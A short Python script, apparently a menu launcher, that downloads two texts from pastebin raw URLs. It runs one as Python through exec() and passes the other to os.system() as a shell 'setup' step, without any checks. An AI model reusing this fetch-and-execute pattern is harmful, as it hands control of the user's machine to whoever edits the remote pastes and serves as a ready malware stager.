import requests
import os
Data = "https://pastebin.com/raw/cqHDmWy4"  # Pastebin URL
Setup = "https://pastebin.com/raw/PuCnJWEj"  # Pastebin Setup Url
precode = requests.get(Data)  # Getting Code as STR
setuprecode = requests.get(Setup)
# Converting Fetched Data to Text Format as Exec() only accepts string values as Source
code = precode.text
setupcode = setuprecode.text


def main():
    os.system("cls")
    print("What Do You Choose !")
    print("""
 [1] Run Setup
 [2] Run Code Normaly

 
    """)
    x = input("Your Choice : ")
    if x == "2":
        exec(code)
    elif x == "1":
        os.system(setupcode)
        main()
    else:
        print("Option Doesnt Exists !")
        main()


main()
